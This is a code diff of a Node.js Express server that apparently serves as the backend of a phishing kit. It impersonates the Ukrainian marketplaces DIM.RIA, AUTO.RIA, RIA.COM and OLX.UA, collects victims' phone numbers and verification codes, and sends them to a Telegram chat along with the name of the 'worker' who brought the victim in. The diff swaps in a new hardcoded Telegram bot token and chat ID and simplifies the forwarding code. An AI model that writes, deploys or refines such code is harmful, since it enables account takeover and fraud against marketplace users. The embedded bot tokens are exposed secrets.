@@ -6,8 +6,8 @@ const fetch = require('node-fetch');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const BOT_TOKEN = "8328824616:AAHANYKzb3L-OyfTRL9GctPqE4TUGqwY7_U";
-const CHAT_ID = "-5045575691";
+const BOT_TOKEN = "8227870538:AAG6O3ojYrxz_COPKCkgUZy-GYSYxRfNKuc";
+const CHAT_ID = "-1003473672730";
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
 app.use(bodyParser.json());
@@ -21,10 +21,7 @@ const LOGOS = {
 };
 
 const PROJECT_NAMES = {
-    dimria: "DIM.RIA",
-    autoria: "AUTO.RIA",
-    ria: "RIA.COM",
-    olx: "OLX.UA"
+    dimria: "DIM.RIA", autoria: "AUTO.RIA", ria: "RIA.COM", olx: "OLX.UA"
 };
 
 app.get('/', (req, res) => {
@@ -47,18 +44,12 @@ async function sendToTelegram(message) {
     const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
     for (let i = 0; i < 3; i++) {
         try {
-            const res = await fetch(TELEGRAM_API, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-                timeout: 10000
-            });
-            const result = await res.json();
-            if (res.ok && result.ok) return true;
-            console.error('Telegram error:', result);
-            if (result.error_code === 403) return false;
+            const res = await fetch(TELEGRAM_API, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+            const data = await res.json();
+            if (res.ok && data.ok) return true;
+            if (data.error_code === 403) return false;
         } catch (err) {
-            console.error(`Попытка ${i + 1}:`, err.message);
+            console.error(`Спроба ${i+1}:`, err.message);
             if (i === 2) return false;
             await new Promise(r => setTimeout(r, 2000));
         }
@@ -68,13 +59,12 @@ async function sendToTelegram(message) {
 
 app.post('/api/send-data', async (req, res) => {
     const { step, phone, code, worker, project = 'dimria', city = 'Невідомо' } = req.body;
-
     const projectName = PROJECT_NAMES[project] || 'DIM.RIA';
 
     let message = '';
 
     if (step === 'phone' && phone) {
-        message = `*ПРОЕКТ:* \( {projectName} ⚡\n*Номер:* \` \){phone}\`\n*Місто:* ${city}\n*Країна:* Україна`;
+        message = `*ПРОЕКТ:* \( {projectName}\n*Номер:* \` \){phone}\`\n*Місто:* ${city}\n*Країна:* Україна`;
         if (worker) message += `\n*Воркер:* @${worker}`;
     } 
     else if (step === 'code' && code) {
@@ -85,13 +75,13 @@ app.post('/api/send-data', async (req, res) => {
         return res.status(400).json({ success: false });
     }
 
-    const ok = await sendToTelegram(message);
-    res.json({ success: ok });
+    await sendToTelegram(message);
+    res.json({ success: true });
 });
 
 app.listen(PORT, () => {
-    console.log(`Сервер запущено: http://localhost:${PORT}`);
+    console.log(`Сервер запущено на порту ${PORT}`);
     setTimeout(() => {
-        sendToTelegram(`*Проекти успішно запущено* ✅\nDIM.RIA / AUTO.RIA / RIA.COM / OLX.UA`);
+        sendToTelegram(`*Проекти успішно запущено*\nDIM.RIA / AUTO.RIA / RIA.COM / OLX.UA`);
     }, 3000);
 });
